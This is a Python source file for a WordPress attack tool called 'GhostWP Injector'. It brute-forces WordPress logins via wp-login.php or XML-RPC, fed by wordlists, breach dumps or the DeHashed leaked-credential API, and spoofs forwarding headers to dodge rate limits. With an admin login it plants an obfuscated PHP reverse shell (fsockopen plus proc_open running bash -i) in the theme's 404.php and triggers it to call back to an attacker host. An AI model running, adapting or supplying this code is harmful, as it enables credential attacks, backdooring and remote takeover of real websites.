import mechanicalsoup
import argparse
import requests
from requests.auth import HTTPBasicAuth
import sys
import json
import base64
from tqdm import tqdm
from colorama import Fore, Style
import concurrent.futures
from urllib.parse import urlparse, urlunparse
import xmlrpc.client as xmlrpclib

print("__" * 45)

print(Fore.RED + """
┏┓┓     ┓ ┏┏┓  ┳  •        
┃┓┣┓┏┓┏╋┃┃┃┃┃  ┃┏┓┓┏┓┏╋┏┓┏┓
┗┛┛┗┗┛┛┗┗┻┛┣┛  ┻┛┗┃┗ ┗┗┗┛┛ 
                  ┛         """ + Fore.WHITE + "Wordpress Shell Injector V2 Developed By " + "\033[38;5;208mThe Intrusion Team\033[0m" + Fore.RESET)
print("__" * 45 + "\n")

#Add arguments
parser = argparse.ArgumentParser(description='Help options --url WORDPRESS_SERVER, --username USERNAME/EMAIL, --inject_only, --shell_injector, --breachfile BREACHFILE, --LHOST LHOST, --LPORT LPORT, --wordlist WORDLIST, --dehashed --email DEHASHED EMAIL --apikey APIKEY --search TARGET EMAIL')
parser.add_argument('--url', type=str, help='--url WORDPRESS_URL add http(s)://URL for wordpress site') # Set wordpress server URL
parser.add_argument('--username', type=str, help='--username USERNAME set email or username for wordpress account') # Set username to attack 
parser.add_argument('--shell_injector', action='store_true', help='--shell_inject PASSWORD to inject PHP reverse shell into wordpress site you must specify --LHOST and --LPORT') # Add --shell_injector to inject php reverse shell
parser.add_argument('--inject_only', type=str, help='--inject_only PASSWORD inject a PHP reverse shell into wordpress site you must specify --LHOST and --LPORT') # Add --inject_only to inject php reverse shell
parser.add_argument('--remove_backdoor', action='store_true', help='--remove_backdoor replace reverse shell code with defaukt 404 script') # Remove backdoor
parser.add_argument('--dehashed', action='store_true', help="--dehashed uses dehashed API to build a wordlist from leaked credentials, requires the --email DEHASHED EMAIL, --apikey APIKEY and --search TARGET EMAIL arguments to work") # Uses dehashed API to build a password list
parser.add_argument('--breachfile', type=str, help='--breachfile BREACHFILE uses leaked credentials to build a password list, specify path to breachfile must be in JSON format') # Add --breachfile file.json
parser.add_argument('--wordlist', type=str, help='--wordlist WORDLIST specify path_to_wordlist option to use a password list insteaad of --breachfile or --dehashed flag ') # Use a wordlist to bruteforce logins
parser.add_argument('--LHOST', type=str, help='--LHOST LHOST to send connection back to') # Add LHOST option for reverse shell
parser.add_argument('--LPORT', type=int, help='--LPORT LPORT to send connection back to') # Add LPORT option for reverse shell
parser.add_argument('--email', type=str, help='--email DEHASHED EMAIL enter your dehashed email address') # Authenticate with email
parser.add_argument('--apikey', type=str, help='--api-key APIKEY for your dehashed account') # Authenticate user API key
parser.add_argument('--search', type=str, help='--search TARGET EMAIL to get leaked credentials using dehashed API') # Email address to get leaked credentials
parser.add_argument('--workers', type=int, default=5, help='--workers NUM_OF_WORKERS set number of workers (default: 5)')
parser.add_argument('--mode_xml', action='store_true', help='Brute for with XML-RPC') # Set --mode_xml to start xml brute-force


args = parser.parse_args()

if args.url is None or args.username is None:
    print("[!] You must provide a vaid wordpress URL with --url and a username with --username")
    sys.exit()
elif "http" not in args.url:
    print("[!] URL must have http(s):// before IP or domain")
    sys.exit()

input_url = args.url # Wordpress Server
parsed_url = urlparse(input_url) # Parse URL
base_url = urlunparse((parsed_url.scheme, parsed_url.netloc, '', '', '', '')) # Strip /[DIR]
wplogin_url = base_url + "/wp-login.php" # Wordpress login URL
xml_url = base_url + "/xmlrpc.php" # xmlrpc login page
username = args.username # Username of target
password_list = [] # Store passwords in list
correct_password = [] # Store correct password

# Dehashed API config
dehashed_email = args.email # DeHashed account email
api_key = args.apikey # DeHashed apikey
target_email = args.search # Target Email

print("[!] Wordpress Server: " + base_url[7:])
print("[!] Wordpress Account: " + str(username))

# Send GET request to wordpress if no response then exit
try:
    r = requests.get(base_url)
except OSError:
    print("[!] Server Unreachable")
    sys.exit()

# Send POST request to check if XML-RPC is enabled
try:
    xmlrpc = requests.post(xml_url)
    if xmlrpc.status_code == 200:
        print("[!] XML-RPC is enabled")
    else:
        print("[!] XML-RPC is disabled: ")
except OSError:
    print("[!] Server Unreachable")
    sys.exit()

# Original wordpress 404_page php script
_404_page = """ <?php /** * The template for displaying 404 pages (not found) * @package WordPress * @subpackage Twenty_Fifteen * @since Twenty Fifteen 1.0 */ get_header(); ?><div id="primary" class="content-area"><main id="main" class="site-main" role="main"><section class="error-404 not-found"><header class="page-header"><h1 class="page-title"><?php _e( 'Oops! That page can&rsquo;t be found.', 'twentyfifteen' ); ?></h1></header><!-- .page-header --><div class="page-content"><p><?php _e( 'It looks like nothing was found at this location. Maybe try a search?', 'twentyfifteen' ); ?></p><?php get_search_form(); ?></div><!-- .page-content --></section><!-- .error-404 --></main><!-- .site-main --></div><!-- .content-area --><?php get_footer(); ?>"""

User_Agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" # Firefox user agent
# Custom headers to bypass rate limiting
headers = {
        'User-Agent':User_Agent,
        'X-Originating-IP': '127.0.0.1',
        'X-Forwarded-For': '127.0.0.1',
        'X-Forwarded': '127.0.0.1',
        'Forwarded-For': '127.0.0.1',
        'X-Remote-IP': '127.0.0.1',
        'X-Remote-Addr': '127.0.0.1',
        'X-ProxyUser-Ip': '127.0.0.1',
        'X-Original-URL': '127.0.0.1',
        'Client-IP': '127.0.0.1',
        'True-Client-IP': '127.0.0.1',
        'Cluster-Client-IP': '127.0.0.1',
        'X-ProxyUser-Ip': '127.0.0.1'

}

def wordpress_login():
    try:
        print("[!] Initiating brute force attack")
        browser = mechanicalsoup.StatefulBrowser()
        browser.session.headers.update(headers)
        response = browser.open(wplogin_url)

        # Initialize tqdm progress bar
        with tqdm(total=len(password_list), desc="[*] Bruteforcing Password", unit="passwords",bar_format="{l_bar}%s{bar}%s{r_bar}" % (Fore.GREEN, Style.RESET_ALL),leave=False) as pbar:

            # Form to authenticate user
            for password in password_list:
                browser.select_form('form')
                browser["log"] = username
                browser["pwd"] = password
                browser.submit_selected()

                page = browser.get_current_page()  # Get response from current page

                # Checks for a 403 status code, if so exits
                if response.status_code == 403:
                    print("[!] 403 error: Access Denied")
                    sys.exit()

                # Checks for a 401 status code, if so exits
                elif response.status_code == 401:
                    print("[!] 401 error: Not Authorized")
                    sys.exit()

                # Checks for a 500 status code, if so exits
                elif response.status_code == 500:
                    print("[!] 500 error: Server is Down")
                    sys.exit()

                # Checks for a 503 status code, if so exits
                elif response.status_code == 503:
                    print("[!] 503 error: Exceeded rate limit")
                    sys.exit()

                # Check if 'Block Reason' found in response
                elif "block reason" in page.text.lower():
                    print("[!] Blocked by Wordfence")
                    sys.exit()

                # Check if 'exceeded the maxmium' found in response
                elif "exceeded the maxmium" in page.text.lower():
                    print("[!] Exceeded rate limit")
                    sys.exit()

                # Check if user account has been locked out 
                elif "too many failed login attempts" in page.text.lower() or "you have been locked out" in page.text.lower():
                    print(f"[!] Too many login attempts. Account: {username} has been locked out")
                    sys.exit()

                # Check if username is valid or not
                elif "invalid username" in page.text.lower():
                    print(f"[!] Invalid username: {username}")
                    sys.exit()

                # Detect 2FA in URL path
                elif "2fa" in page.text.lower() or "otp" in page.text.lower():
                    print("[!] 2FA detected")
                    sys.exit()

                # Checks if your IP address was blocked
                elif "Your IP address " in browser.get_url():
                    print("[!] IP address has been blocked")
                    sys.exit()

                # Check if login was successful by looking for the "dashboard" keyword
                elif "dashboard" not in page.text.lower():
                    pass
                else:
                    print("\n[+] Login successful:", "".join(password))  # Print correct password to screen
                    pbar.close()
        
                    # Check if we have admin access
                    if "plugins" in page.text.lower():
                        print("[+] Admin: True")
                        if args.shell_injector:
                            if args.LHOST is not None: # Detect if LHOST argument is used
                                base64_encode = base64.b64encode(bytes(args.LHOST,encoding="utf-8")) # Base64 encode LHOST argument
                                LHOST = base64_encode.decode() # Convert bytes object to string
                            else:
                                print("[!] LHOST is required for --shell option: use --LHOST LHOST")
                                sys.exit()
                            if args.LPORT is not None: # Detect if LPORT argument is used
                                LPORT = args.LPORT # Update LPORT variable
                            else:
                                print("[!] LPORT required for --shell option: use --LPORT LPORT")
                                sys.exit()
                            print("[*] Injecting GhostWP backdoor into 404.php file")

                            # Obfuscated PHP reverse shell
                            payload = """ <?php $obf_set_time_limit='set_time_limit';$obf_set_time_limit(0);$obf_KEY='MS4w';$obf_target=base64_decode('""" + LHOST + """');$obf_gate=""" + str(LPORT) + """^12345;$obf_data_size=1400;$obf_write_buffer=$obf_error_buffer=null;$obf_cmd='uname -a; w; id; bash -i';$obf_bg=0;$obf_ctrl='pcntl_fork';$obf_session='posix_setsid';if(function_exists($obf_ctrl)){$pid=$obf_ctrl();if($pid==-1){printit("Session start failed");exit(1);}if($pid){exit(0);}if($obf_session()==-1){printit("Session continuation failed");exit(1);}$obf_bg=1;}else{printit("Routine notice: continuation not possible.");}chdir("/");umask(0);$obf_comm_link='fsockopen';$obf_connection=$obf_comm_link($obf_target,$obf_gate^12345,$errno,$errstr,30);if(!$obf_connection){printit("Access denied: ".$errstr);exit(1);}$obf_pipe_spec=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$obf_process_init='proc_open';$obf_proc=$obf_process_init($obf_cmd,$obf_pipe_spec,$pipes);if(!is_resource($obf_proc)){printit("Routine failed: task start not possible");exit(1);}foreach($pipes as $pipe){stream_set_blocking($pipe,0);}stream_set_blocking($obf_connection,0);printit("Access successful.");while(1){if(feof($obf_connection)){printit("Connection unexpectedly closed.");break;}if(feof($pipes[1])){printit("Task ended unexpectedly.");break;}$read_a=array($obf_connection,$pipes[1],$pipes[2]);$num_changed_sockets=stream_select($read_a,$obf_write_buffer,$obf_error_buffer,null);if(in_array($obf_connection,$read_a)){$input=fread($obf_connection,$obf_data_size);fwrite($pipes[0],$input);}if(in_array($pipes[1],$read_a)){$input=fread($pipes[1],$obf_data_size);fwrite($obf_connection,$input);}if(in_array($pipes[2],$read_a)){$input=fread($pipes[2],$obf_data_size);fwrite($obf_connection,$input);}}fclose($obf_connection);foreach($pipes as $pipe){fclose($pipe);}$obf_close_proc='proc_close';$obf_close_proc($obf_proc);function printit($string){global $obf_bg;if(!$obf_bg){echo base64_decode($string)."\n";}}?> """

    
                            # Navigate to the theme editor page for 404.php in twentyfifteen theme
                            browser.open(f"{base_url}/wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen&scrollto=0")
    
                            # Select the form and explicitly set the value of the textarea
                            browser.select_form('#template')
                            browser["newcontent"] = _404_page + "\n" + payload
                            browser.submit_selected(btnName="submit")

                            # Check if file update was successful by looking for the "file edited successfully" message
                            page = browser.get_current_page()
                            if "file edited successfully" in page.text.lower():
                                print("[+] Successfully backdoored 404.php file")
                                print("[*] Triggering backdoor")
                                browser.open(base_url + "/HACKED_X1337")
                                browser.close()
                                sys.exit()
                            else:
                                print("[!] 404.php file update failed")
                                browser.close()

                        else:
                            browser.close()
                            sys.exit()
                    else:
                        print("[!] Admin: False")
                        browser.close()
                        sys.exit()

                pbar.update(1) # Update the progress bar

    except Exception as e:
        print(f"[!] An error occurred: {str(e)}")
        sys.exit()
    except KeyboardInterrupt:
        print("[!] GhostWP Injector: Initiating Shutdown Goodbye")
        sys.exit()

def attempt_login(password):
    data = {
        "log":username,
        "pwd":password,
        "wp-submit": "Log+in",
        "redirect_to": "http://10.1.1.161/wp-admin/"
    }
    r = requests.post(wplogin_url, data=data)

    # Checks for a 403 status code, if so exits
    if r.status_code == 403:
        return "[!] 403 error: Access Denied", False, True

    # Checks for a 401 status code, if so exits
    elif r.status_code == 401:
        return "[!] 401 Error: Not Authorized", False, True

    # Checks for a 500 status code, if so exits
    elif r.status_code == 500:
        return "[!] 500 Error: Server Down", False, True

    # Checks for a 500 status code, if so exits
    elif r.status_code == 503:
        return "[!] 503 Error: Rate Limit Exceeded", False, True

    # Check if user account has been locked out, then exits
    elif "too many failed login attempts" in r.text.lower() or "you have been locked out" in r.text.lower():
        return f"[!] Too many login attempts. Account: {username} has been locked out", False, True

    # Check if username is valid or not, if so exits
    elif "invalid username" in r.text.lower():
        return f"[!] Invalid username: {username}", False, True

    # Detect 2FA in URL path, if so exits
    elif "2fa" in r.text.lower():
        return "[!] 2FA Required", False, True

    # Checks if your IP address was blocked, if so exits
    elif "your ip address" in r.text.lower():
        return "[!] IP address has been blocked", False, True

    # Checks for dashboard string in response, if so login successful
    elif 'dashboard' in r.text.lower():
        correct_password.append([password]) # Add correct password to list correct_password
        if 'plugins' in r.text.lower():
            return f"[+] Login Successful: {password}\n[+] Admin: True", True, True
        else:
            return f"[+] Login Successful: {password}\n[!] Admin: False", True, True

    return None, False, False

def threaded_login(max_workers):
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(attempt_login, password): password for password in password_list}
        try:
            for future in tqdm(concurrent.futures.as_completed(futures), total=len(futures), desc="[*] Bruteforcing Password", unit="passwords", bar_format="{l_bar}%s{bar}%s{r_bar}" % (Fore.GREEN, Style.RESET_ALL), leave=False):
                result, success, terminate = future.result()
                if result:
                    print(result)
                if success or terminate:
                    for fut in futures:
                        fut.cancel()
                    executor.shutdown(wait=False)
                    return
        except KeyboardInterrupt:
            print("[!] initiating Program Shutdown")
            sys.exit()
        except Exception as e:
            print(f"{str(e)}")

def mechanize_login():
    if correct_password:
        try:
            browser = mechanicalsoup.StatefulBrowser()
            browser.session.headers.update(headers)
            response = browser.open(wplogin_url)

            # Form to authenticate user
            browser.select_form('form')
            browser["log"] = username
            browser["pwd"] = correct_password[0][0]  # Access the first element in correct_password list
            browser.submit_selected()

            page = browser.get_current_page()  # Get response from current page

            # Checks for a 403 status code, if so exits
            if response.status_code == 403:
                print("[!] 403 error: Access Denied")
                sys.exit()

            # Checks for a 401 status code, if so exits
            elif response.status_code == 401:
                print("[!] 401 error: Not Authorized")
                sys.exit()

            # Checks for a 500 status code, if so exits
            elif response.status_code == 500:
                print("[!] 500 error: Server is Down")
                sys.exit()

            # Checks for a 503 status code, if so exits
            elif response.status_code == 503:
                print("[!] 503 error: Exceeded rate limit")
                sys.exit()

            # Check if 'Block Reason' found in response
            elif "block reason" in page.text.lower():
                print("[!] Blocked by Wordfence")
                sys.exit()

            # Check if 'exceeded the maxmium' found in response
            elif "exceeded the maxmium" in page.text.lower():
                print("[!] Exceeded rate limit")
                sys.exit()

            # Check if user account has been locked out 
            elif "too many failed login attempts" in page.text.lower() or "you have been locked out" in page.text.lower():
                print(f"[!] Too many login attempts. Account: {username} has been locked out")
                sys.exit()

            # Check if username is valid or not
            elif "invalid username" in page.text.lower():
                print(f"[!] Invalid username: {username}")
                sys.exit()

            # Detect 2FA in URL path
            elif "2fa" in page.text.lower() or "otp" in page.text.lower():
                print("[!] 2FA detected")
                sys.exit()

            # Checks if your IP address was blocked
            elif "your ip address " in browser.get_url().lower():
                print("[!] IP address has been blocked")
                sys.exit()

            # Check if login was successful by looking for the "dashboard" keyword
            elif "dashboard" not in page.text.lower():
                print("[!] Invalid password")
            else:

                # Check if we have admin access
                if "plugins" in page.text.lower():
                    if args.shell_injector or args.inject_only:
                        if args.remove_backdoor:
                            payload = _404_page
                            print("[!] Removing backdoor in 404.php file")
                        else:
                            if args.LHOST is not None:  # Detect if LHOST argument is used
                                base64_encode = base64.b64encode(bytes(args.LHOST, encoding="utf-8"))  # Base64 encode LHOST argument
                                LHOST = base64_encode.decode()  # Convert bytes object to string
                            else:
                                print("[!] LHOST is required for --shell option: use --LHOST LHOST")
                                sys.exit()
                            if args.LPORT is not None:  # Detect if LPORT argument is used
                                LPORT = args.LPORT  # Update LPORT variable
                            else:
                                print("[!] LPORT required for --shell option: use --LPORT LPORT")
                                sys.exit()

                            # Obfuscated PHP reverse shell
                            payload = """ <?php $obf_set_time_limit='set_time_limit';$obf_set_time_limit(0);$obf_KEY='MS4w';$obf_target=base64_decode('""" + LHOST + """');$obf_gate=""" + str(LPORT) + """^12345;$obf_data_size=1400;$obf_write_buffer=$obf_error_buffer=null;$obf_cmd='uname -a; w; id; bash -i';$obf_bg=0;$obf_ctrl='pcntl_fork';$obf_session='posix_setsid';if(function_exists($obf_ctrl)){$pid=$obf_ctrl();if($pid==-1){printit("Session start failed");exit(1);}if($pid){exit(0);}if($obf_session()==-1){printit("Session continuation failed");exit(1);}$obf_bg=1;}else{printit("Routine notice: continuation not possible.");}chdir("/");umask(0);$obf_comm_link='fsockopen';$obf_connection=$obf_comm_link($obf_target,$obf_gate^12345,$errno,$errstr,30);if(!$obf_connection){printit("Access denied: ".$errstr);exit(1);}$obf_pipe_spec=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$obf_process_init='proc_open';$obf_proc=$obf_process_init($obf_cmd,$obf_pipe_spec,$pipes);if(!is_resource($obf_proc)){printit("Routine failed: task start not possible");exit(1);}foreach($pipes as $pipe){stream_set_blocking($pipe,0);}stream_set_blocking($obf_connection,0);printit("Access successful.");while(1){if(feof($obf_connection)){printit("Connection unexpectedly closed.");break;}if(feof($pipes[1])){printit("Task ended unexpectedly.");break;}$read_a=array($obf_connection,$pipes[1],$pipes[2]);$num_changed_sockets=stream_select($read_a,$obf_write_buffer,$obf_error_buffer,null);if(in_array($obf_connection,$read_a)){$input=fread($obf_connection,$obf_data_size);fwrite($pipes[0],$input);}if(in_array($pipes[1],$read_a)){$input=fread($pipes[1],$obf_data_size);fwrite($obf_connection,$input);}if(in_array($pipes[2],$read_a)){$input=fread($pipes[2],$obf_data_size);fwrite($obf_connection,$input);}}fclose($obf_connection);foreach($pipes as $pipe){fclose($pipe);}$obf_close_proc='proc_close';$obf_close_proc($obf_proc);function printit($string){global $obf_bg;if(!$obf_bg){echo base64_decode($string)."\n";}}?> """

                        # Navigate to the theme editor page for 404.php in twentyfifteen theme
                        browser.open(f"{base_url}/wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen&scrollto=0")

                        # Select the form and explicitly set the value of the textarea
                        browser.select_form('#template')
                        browser["newcontent"] = _404_page + "\n" + payload
                        browser.submit_selected(btnName="submit")

                        # Check if file update was successful by looking for the "file edited successfully" message
                        page = browser.get_current_page()
                        if "file edited successfully" in page.text.lower():
                            if args.remove_backdoor:
                                print("[+] Successfully removed backdoor from 404.php file")
                                browser.close()
                                sys.exit()
                                
                            print("[+] Successfully backdoored 404.php file")
                            print("[*] Triggering backdoor")
                            browser.open(base_url + "/HACKED_X1337")
                            sys.exit()
                        else:
                            print("[!] 404.php file update failed")
                            browser.close()

                    else:
                        browser.close()
                        sys.exit()
                else:
                    print("[!] Admin: False")
                    browser.close()
                    sys.exit()

        except Exception as e:
            print(f"[!] An error occurred: {str(e)}")
            sys.exit()
        except KeyboardInterrupt:
            print("[!] GhostWP Injector: Initiating Shutdown Goodbye")
            sys.exit()



# Read from a password list & add passwords to password_list
def wordlist(passwordfile):
    with open(passwordfile, 'r') as passfile:
        read_wordlist = passfile.readlines()
        for word in read_wordlist:
            password_list.append(word.strip())

def search_dehashed(username, email, api_key):
    url = f'https://api.dehashed.com/search' # URL endpoint for DeHashed API
    # Parameters for the API request, focusing on a specific username
    params = {'query': f'email:"{username}"'}
    # Headers for the request
    headers = {
        'Accept': 'application/json'
    }
    
    try:
        # Sending the GET request with basic authentication
        response = requests.get(url, params=params, auth=HTTPBasicAuth(email, api_key), headers=headers)
        response.raise_for_status()  # Raises stored HTTPError, if one occurred
        # Parsing the JSON response
        data = response.json()
        return data
    except requests.RequestException as e:
        print(f'[!] An error occurred: {e}')
        return None

def extract_passwords(data):
    # Check if 'entries' key is in data and it contains items
    if 'entries' in data and data['entries']:
        # Iterate over each entry
        for entry in data['entries']:
            # Check if 'password' key is in the entry and print only if a password is found
            if 'password' in entry and entry['password']:
                password_list.append(entry['password'])

# Dehashed function to build passwords from leaked credentials
def dehashed_API():
    # Fetching the data from DeHashed
    print("[*] Authenticating to Dehashed API")
    result = search_dehashed(target_email, dehashed_email, api_key)
    if result:
        extract_passwords(result)
    else:
        print("[!] No data found or there was an error in the request.")

# Extract passwords from a JSON file
def Extract_Darkweb_Passwords(json_file):
    print(f"[*] Extracting passwords from databreach file: {json_file}")
    # Load JSON data from file
    try:
        with open(json_file, 'r') as file:
            data = json.load(file)

        # Recursive function to find and print passwords
        def find_passwords(obj):
            if isinstance(obj, dict):  # Check if the item is a dictionary
                for key, value in obj.items():
                    if key == 'password':  # Check if the key is 'password'
                        password_list.append([value])
                    else:
                        find_passwords(value)  # Recurse into the value
            elif isinstance(obj, list):  # Check if the item is a list
                for item in obj:
                    find_passwords(item)  # Recurse into each item in the list

        find_passwords(data) # Start the recursive search from the top-level data

    except FileNotFoundError:
        print(f"[!] {json_file} File not found")
        sys.exit()

def login_to_wordpress_with_xml(url, username, password):
    server = xmlrpclib.ServerProxy(url)
    try:
        blogs = server.wp.getUsersBlogs(username, password)
        for blog in blogs:
            if blog['isAdmin']:
                print("[+] Admin Access: True")
                return True, None
        return True, None
    except xmlrpclib.Fault as fault:
        if 'blocked' in fault.faultString.lower():
            return False, 'IP Blocked'
        elif 'lockout' in fault.faultString.lower():
            return False, 'Account Lockout'
        elif '2fa' in fault.faultString.lower() or 'two-factor' in fault.faultString.lower() or 'otp' in fault.faultString.lower():
            return False, '2FA Required'
        return False, 'Incorrect Password'

def attempt_login_with_xml(url, username, password):
    success, reason = login_to_wordpress_with_xml(url, username, password)
    return password if success else None, reason

def thread_xml(wordpress_url, wordpress_username, wordlist_file, max_workers):
    wordlist(wordlist_file)
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(attempt_login_with_xml, wordpress_url, wordpress_username, password): password for password in password_list}
            
            with tqdm(total=len(futures), desc="[*] Bruteforcing Password", unit="passwords", bar_format="{l_bar}%s{bar}%s{r_bar}" % (Fore.GREEN, Style.RESET_ALL), leave=False) as pbar:
                for future in concurrent.futures.as_completed(futures):
                    result, reason = future.result()
                    if result:
                        print(f"[+] Login Successful: {result}")
                        correct_password.append([result])
                        for fut in futures:
                            fut.cancel()
                        executor.shutdown(wait=False)
                        pbar.close()
                        sys.exit()
                    elif reason and reason != 'Incorrect Password':
                        print(f"\nError: {reason}")
                        for fut in futures:
                            fut.cancel()
                        executor.shutdown(wait=False)
                        pbar.close()
                        sys.exit()
                    pbar.update(1)
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received. Exiting...")
        sys.exit()

    print("Password not found in the word list.")

if args.mode_xml:
    if args.wordlist and args.username and args.workers is None:
        print("[!] --wordlist WORDLIST, --username USERNAME and --workers NUM_OF_WORKERS is required")
        sys.exit()
    try:
        r = requests.post(args.url + "/xmlrpc.php")
        if r.status_code == 200:
            print("[!] XML-RPC is enabled")
        else:
            print("[!] XML-RPC is disabled: " + r.text)
    except OSError:
        print("[!] Server Unreachable")
        sys.exit()


    if not args.url.endswith("/xmlrpc.php"):
        if args.url.endswith("/"):
            args.url += "xmlrpc.php"
        else:
            args.url += "/xmlrpc.php"

    thread_xml(args.url, args.username, args.wordlist, args.workers)
       

# Don't bruteforce login just inject shell code with supplied password
if args.inject_only is not None:
    correct_password.append([args.inject_only])
    mechanize_login()
    if args.LPORT is None and args.LHOST is None:
        print("[!] --LHOST LHOST and --LPORT LPORT arguments are required")
        sys.exit()

# Build a wordlist utilizing the dehashed API
if args.dehashed:
    # Check if email flag is used
    if args.email is None:
        print("[!] dehashed flag requires: --email EMAIL")
        sys.exit()
    # Check if apikey flag is used
    elif args.apikey is None:
        print("[!] dehashed flag requires: --apikey APIKEY")
        sys.exit()
    # Check if search flag is used
    elif args.search is None:
        print("[!] dehashed flag requires: --search TARGET EMAIL")
        sys.exit()

    dehashed_API() # Run dehashed function if dehashed flag is used

elif args.wordlist is not None:
    print(f"[!] wordlist: {args.wordlist}")
    wordlist(args.wordlist)

elif args.breachfile is not None:
    if '.json' not in args.breachfile:
        print("[!] File type must .json")
        sys.exit()
    Extract_Darkweb_Passwords(args.breachfile)

elif args.breachfile is None and args.wordlist is None and not args.dehashed and args.inject_only is None:
    print("[!] GhostWP Injector requires either a --breachfile path to breachfile, --wordlist path to wordlist or --inject-only PASSWORD")
    sys.exit()

print("[!] Number of passwords:", len(password_list))

if args.workers is not None:
    if args.workers not in range(1,100):
        print("[!] Workers must be in range of 1-100")
        sys.exit()
    else:
        print(f"[!] Number of workers: {args.workers}")
        threaded_login(args.workers)
        if correct_password is not None:
            mechanize_login()
else:
    wordpress_login()
